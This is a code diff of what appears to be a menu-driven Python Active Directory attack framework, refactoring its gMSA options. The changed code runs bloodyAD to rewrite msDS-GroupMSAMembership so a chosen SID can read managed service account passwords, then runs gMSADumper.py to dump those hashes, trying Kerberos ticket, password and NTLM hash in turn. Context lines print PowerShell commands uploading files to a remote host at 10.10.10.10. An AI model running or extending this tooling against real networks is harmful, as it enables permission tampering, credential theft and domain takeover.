@@ -851,7 +851,7 @@ def options():
       print(colored(menuName.rstrip(" "),colour0, attrs=['blink']), end= ' ')
    else:
       print(menuName.rstrip(" "), end= ' ')
-   print("(609) gMSA    Dumper (709) Certipy 9 (719) ADMinerGUI " + '\u2551')
+   print("(609) gMSA Dump Hash (709) Certipy 9 (719) ADMinerGUI " + '\u2551')
    print('\u255A' + '\u2550'*280 + '\u255D')
    return
    
@@ -3882,6 +3882,7 @@ while True:
          print("    -Command \"(New-Object Net.WebClient).UploadFile('ftp://10.10.10.10/exploit.sh','C:\\local\\exploit.sh')\"")
          print("    -Command \"Copy-Item 'C:\\local\\exploit.sh' -Destination '\\\\remotehost\\share\\'\"")
          print("    -Command \"Invoke-WebRequest -Uri 'https://10.10.10.10/exploit.sh' -Method Post -InFile 'C:\\local\\exploit.sh' -ContentType 'application/octext-stream'\"")
+         print("    -Command run 'REG ADD HKCU\\Console /v VirtualTerminalLevel /t REG_DWORD /d 1' and then start a new CMD")
          localCOM("echo '" + Reset + "'")
          if NTM[:5] != "EMPTY":
             print("[i] Using the HASH value as a password credential...")
@@ -4754,7 +4755,7 @@ while True:
             remoteCOM("ldapdomaindump -u '" + DOM.rstrip(" ") + '\\' + USR.rstrip(" ") + "' -p :" + NTM.rstrip(" ") +" " + TIP.rstrip(" ") + " -o " + workDir)
          else:
             remoteCOM("ldapdomaindump -u '" + DOM.rstrip(" ") + '\\' + USR.rstrip(" ") + "' -p '" + PAS.rstrip(" ") +"' " + TIP.rstrip(" ") + " -o " + workDir)                     
-         print(colored("[*] Checking downloaded files...\n", colour3))
+         print(colored("[*] Checking downloaded files...", colour3))
          localCOM("ls -la ./" + workDir + "/*.* > check.tmp")
          catsFile("check.tmp")
       prompt()      
@@ -4960,22 +4961,50 @@ while True:
       AD2 = "msDS-GroupMSAMembership"
       AD3 = input("[?] Please enter the target SID user value: ")
       SKEW = timeSync(SKEW)
-      if PAS[:2] != "''":   
-         try:
-            print("[i] Using ticket as credential...")
-            localCOM("bloodyAD --host " + SDM.rstrip(" ") + " -d " + DOM.rstrip(" ") + " -u " + USR.rstrip(" ") + " -k set object " + AD1.rstrip(" ") + " " + AD2.rstrip(" ") + " -v 'O:SYD:(A;;0x00020094;;;" + AD3.rstrip(" ") + ")'") 
-         except:
-            print("[-] Failed to patch MSA using ticket...") 
-            try:
-               print("[i] Using password as credential...")    
-               localCOM("bloodyAD --host " + SDM.rstrip(" ") + " -d " + DOM.rstrip(" ") + " -u " + USR.rstrip(" ") + " -p " + PAS.rstrip(" ") + " set object " + AD1.rstrip(" ") + " " + AD2.rstrip(" ") + " -v 'O:SYD:(A;;0x00020094;;;" + AD3.rstrip(" ") + ")'") 
-            except:
-               print("[-] Failed to patch MSA using password ...")
-               try:
-                  print("[i] Using HASH value as credential...")    
-                  localCOM("bloodyAD --host " + SDM.rstrip(" ") + " -d " + DOM.rstrip(" ") + " -u " + USR.rstrip(" ") + " -p :" + NTM.rstrip(" ") + " set object " + AD1.rstrip(" ") + " " + AD2.rstrip(" ") + " -v 'O:SYD:(A;;0x00020094;;;" + AD3.rstrip(" ") + ")'")
-               except:
-                  print("[-] Failed to patch MSA using HASH value...") 
+      if PAS[:2] != "''":
+         print(colored("[*] Attempting to patch MSA permissions...", colour3))
+         commands = [
+            (
+                "ticket",
+                "bloodyAD --host " + SDM.rstrip(" ") +
+                " -d " + DOM.rstrip(" ") +
+                " -u " + USR.rstrip(" ") +
+                " -k set object " +
+                AD1.rstrip(" ") + " " +
+                AD2 + " -v 'O:SYD:(A;;0x00020094;;;" +
+                AD3.rstrip(" ") + ")'"
+            ),
+            (
+                "password",
+                "bloodyAD --host " + SDM.rstrip(" ") +
+                " -d " + DOM.rstrip(" ") +
+                " -u " + USR.rstrip(" ") +
+                " -p " + PAS.rstrip(" ") +
+                " set object " +
+                AD1.rstrip(" ") + " " +
+                AD2 + " -v 'O:SYD:(A;;0x00020094;;;" +
+                AD3.rstrip(" ") + ")'"
+            ),
+            (
+                "HASH value",
+                "bloodyAD --host " + SDM.rstrip(" ") +
+                " -d " + DOM.rstrip(" ") +
+                " -u " + USR.rstrip(" ") +
+                " -p :" + NTM.rstrip(" ") +
+                " set object " +
+                AD1.rstrip(" ") + " " +
+                AD2 + " -v 'O:SYD:(A;;0x00020094;;;" +
+                AD3.rstrip(" ") + ")'"
+            )
+         ]
+         for method, cmd in commands:
+            print(f"[i] Using {method} as credential...")
+            result = localCOM(cmd)   # should return 0 on success
+            if result == 0:
+               print(f"[+] Successfully patched MSA using {method}.")
+               break
+            else:
+               print(f"[-] Failed to patch MSA using {method}.")
       prompt()
 
 # ------------------------------------------------------------------------------------- 
@@ -4990,23 +5019,21 @@ while True:
 
    if selection == '609':
       SKEW = timeSync(SKEW)
-      if PAS[:2] != "''":            
+      if PAS[:2] != "''":
          print(colored("[*] Attempting to dump the MSA HASH...", colour3))
-         try:
-            print("[i] Using ticket as credential...")
-            remoteCOM(keyPath + "gMSADumper.py -k -d " + DOM.rstrip(" "))
-         except:
-            print("[-] Failed to dump MSA HASH using ticket...") 
-            try:
-               print("[i] Using password as credential...")
-               remoteCOM(keyPath + "gMSADumper.py -u " + USR.rstrip(" ") + " -p " + PAS.rstrip(" ") + " -d " + DOM.rstrip(" "))
-            except:
-               print("[-] Failed to dump MSA HASH using password...") 
-               try:
-                  print("[i] Using HASH value as credential...")
-                  remoteCOM(keyPath + "gMSADumper.py -u " + USR.rstrip(" ") + " -p :" + NTM.rstrip(" ") + " -d " + DOM.rstrip(" ")) 
-               except:
-                  print("[-] Failed to dump MSA HASH using HASH value...") 
+         commands = [
+            ("ticket", keyPath + "gMSADumper.py -k -d " + DOM.rstrip(" ")),
+            ("password", keyPath + "gMSADumper.py -u " + USR.rstrip(" ") + " -p " + PAS.rstrip(" ") + " -d " + DOM.rstrip(" ")),
+            ("HASH value", keyPath + "gMSADumper.py -u " + USR.rstrip(" ") + " -p :" + NTM.rstrip(" ") + " -d " + DOM.rstrip(" "))
+         ]
+         for method, cmd in commands:
+            print(f"[i] Using {method} as credential...")
+            result = remoteCOM(cmd)
+            if result == 0:
+                print(f"[+] Success using {method}.")
+                break
+            else:
+                print(f"[-] Failed using {method}.")
       prompt()
       
 # ------------------------------------------------------------------------------------- 
